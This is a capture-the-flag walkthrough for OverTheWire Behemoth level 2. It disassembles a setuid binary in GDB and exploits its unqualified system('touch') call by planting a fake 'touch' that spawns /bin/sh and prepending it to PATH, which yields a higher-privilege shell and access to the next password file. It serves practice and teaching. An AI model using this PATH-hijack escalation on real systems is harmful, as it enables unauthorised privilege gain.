---

layout: post
title: OverTheWire - Behemoth 2
---

Site: http://overthewire.org/wargames/behemoth/ <br>
Level: 2 <br>
Situation: Environment Variable Fun<br><br>

To start we are going to create a directory in /tmp/ to store our files.

{% highlight bash %}
behemoth2@melinda:~$ mkdir /tmp/bhe2
{% endhighlight %}

Let’s go ahead and find out what our file arch is, as well has run it to see what it does.

{% highlight bash %}
behemoth2@melinda:/tmp/bhe2$ file /behemoth/behemoth2
/behemoth/behemoth2: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=490eca1266dce1c6fa5afd37392837976dba68ef, not stripped

behemoth2@melinda:/tmp/bhe2$ /behemoth/behemoth2
asdfasdfasdf
asdf
^C
behemoth2@melinda:/tmp/bhe2$ ls
5254
behemoth2@melinda:/tmp/bhe2$ cat 5254 
behemoth2@melinda:/tmp/bhe2$ 
{% endhighlight %}

Seems to take input and write a file but doesn’t write anything to the file. Let’s inspect the application in GDB and see what is going on.

{% highlight bash %}
behemoth2@melinda:/tmp/bhe2$ gdb -q /behemoth/behemoth2
Reading symbols from /behemoth/behemoth2...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
   -- SNIP --
   0x080485c7 <+90>:	call   0x80486c0 <lstat>
   0x080485cc <+95>:	and    eax,0xf000
   0x080485d1 <+100>:	cmp    eax,0x8000
   0x080485d6 <+105>:	je     0x80485f0 <main+131>
   0x080485d8 <+107>:	mov    eax,DWORD PTR [esp+0x20]
   0x080485dc <+111>:	mov    DWORD PTR [esp],eax
   0x080485df <+114>:	call   0x8048400 <unlink@plt>
   -- SNIP --

   -- SNIP --
   0x080485eb <+126>:	call   0x8048420 <system@plt>
   0x080485f0 <+131>:	mov    DWORD PTR [esp],0x7d0
   0x080485f7 <+138>:	call   0x80483e0 <sleep@plt>
   0x080485fc <+143>:	lea    eax,[esp+0x24]
   0x08048600 <+147>:	mov    DWORD PTR [eax],0x20746163
   0x08048606 <+153>:	mov    BYTE PTR [eax+0x4],0x0
   0x0804860a <+157>:	mov    BYTE PTR [esp+0x28],0x20
   0x0804860f <+162>:	lea    eax,[esp+0x24]
   0x08048613 <+166>:	mov    DWORD PTR [esp],eax
   0x08048616 <+169>:	call   0x8048420 <system@plt>
   -- SNIP --
End of assembler dump.

{% endhighlight %}

So by looking at this dump we notice a few calls being made. lstat","unlink","system","sleep". We know sleep is just a wait function so we can ignore it. This leaves us with lstat, unlink and system. <br><br>
lstat is a function used for checking the status of a file however if it is a syslink then it checks the linked file. <br><br>
Unlink obviously does a few things. It deletes a file if it isn't being used by any other applications. More interestingly if a file is a symlink it removes the link.<br><br>
System executes a system call. <br><br>
Knowing the following we setup a few breakpoints. One on each call, and we inspect the ESP and EAX pointer to see what information is being passed around.

{% highlight bash %}
(gdb) break *0x080485c7
Breakpoint 1 at 0x80485c7
(gdb) break *0x080485df
Breakpoint 2 at 0x80485df
(gdb) break *0x080485eb
Breakpoint 3 at 0x80485eb
(gdb) run
(gdb) x/s $eax
0xffffd64a:	"20518"
(gdb) x/s $esp
0xffffd620:	"J\326\377\377X\326\377\377&P"
(gdb) c
Continuing.
Breakpoint 2, 0x080485df in main ()
(gdb) x/s $eax
0xffffd64a:	"20518"
(gdb) x/s $esp
0xffffd620:	"J\326\377\377X\326\377\377&P"
(gdb) c
Continuing.
Breakpoint 3, 0x080485eb in main ()
(gdb) x/s $eax
0xffffd644:	"touch 20518"
(gdb) x/s $esp
0xffffd620:	"D\326\377\377X\326\377\377&P"
(gdb) 

{% endhighlight %}

From this we can tell that the file being checked for linkage and unlinkage is 20518. However the more interesting thing is the system call being made "touch 20518". By the looks of the code there is no code checking for the actual touch application.<br><br>
Knowing how Linux environment shells work we know we could possible set "touch" to call our own script. When applications ran our environment variables are passed through and utilized during the "system" call. <br><br> To exploit this we just have to redirect the touch command to run a shellscript that spawns a shell. We do this by modifying the paths in our environment.

{% highlight bash %}
behemoth2@melinda:/tmp/bhe2$ echo '/bin/sh' > touch
behemoth2@melinda:/tmp/bhe2$ chmod +x touch
behemoth2@melinda:/tmp/bhe2$ PATH=/tmp/bhe2:$PATH /behemoth/behemoth2
$ whoami
behemoth3
$ cat /etc/behemoth_pass/behemoth3
[OMITTED]
{% endhighlight %}

There is the password